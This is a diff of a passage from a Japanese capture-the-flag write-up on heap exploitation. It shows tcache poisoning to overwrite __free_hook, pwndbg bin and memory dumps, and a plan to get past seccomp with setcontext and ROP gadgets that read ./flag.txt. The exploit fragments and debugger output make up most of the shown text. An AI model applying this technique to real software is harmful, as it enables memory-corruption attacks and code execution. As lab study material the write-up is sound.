@@ -249,6 +249,7 @@ tcachebins
 ```python
 Alloc(0xe0, "\n")
 Alloc(0xe0, "A"*15+"\n")
+View()
 ```
 ```
 0x55555555aed0:	0x0000000000000000	0x0000000000000000
@@ -271,20 +272,19 @@ Alloc(0xe0, "A"*15+"\n")
 Free()
 Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))
 ```
-
+`tcachebins`に`__free_hook`のアドレスを書き込んだ状態
 ```
 pwndbg> bins
 tcachebins
 0x20 [  6]: 0x55555555b2a0 —▸ 0x55555555a770 —▸ 0x55555555ae50 —▸ 0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0
 0x70 [  3]: 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0
-0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸ 0x55555555add0 —▸ 0x55555555af70 —▸ `0x7ffff7f8de38 (__attr_list_lock)` ◂— 0x0
+0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸ 0x55555555add0 —▸ 0x55555555af70 —▸ 0x7ffff7f8de38 (__attr_list_lock) ◂— 0x0
 0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸ 0x555555559800 —▸ 0x555555559370 ◂— 0x0
 ```
 
-`__free_hook`には`seccomp`でシステムコールが制限されているため、ROPに持ち込む必要があるが、`setcontext`関数で使用するレジスタが`rdx`に変更になっているため、直接は使用できない。
+`__free_hook`には`seccomp`でシステムコールが制限されているためsystem関数が使えない。そのためROPに持ち込む必要があるが、`setcontext`関数で使用するレジスタが`rdx`に変更になっているため、直接は使用できない。
 
 他には`push rdi; ... ;pop rsp;...;ret;`のROPガジェットを探したが、利用できるものはなかった。
-
 
 下記のサイトを確認したところ、`mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`と`setcontext`関数のROPガジェットを利用することで、rspレジスタにヒープのアドレスを設定できるので、ROPを利用できる。
 https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/
@@ -297,7 +297,7 @@ ROPでは、`./flag.txt`ファイルを`sys_open`して、`sys_read`、`sys_writ
 0x7ffff7f8de40 <__after_morecore_hook>:	0x000055555555b2c0	0x00007ffff7ef08b0
 ```
 
-下記はヒープにROPを書き込んだ状態
+下記はヒープにROPのコードを書き込んだ状態
 ```
 0x55555555b290:	0x0000000000000000	0x0000000000000021
 0x55555555b2a0:	0x000055555555a770	0x0000555555559010
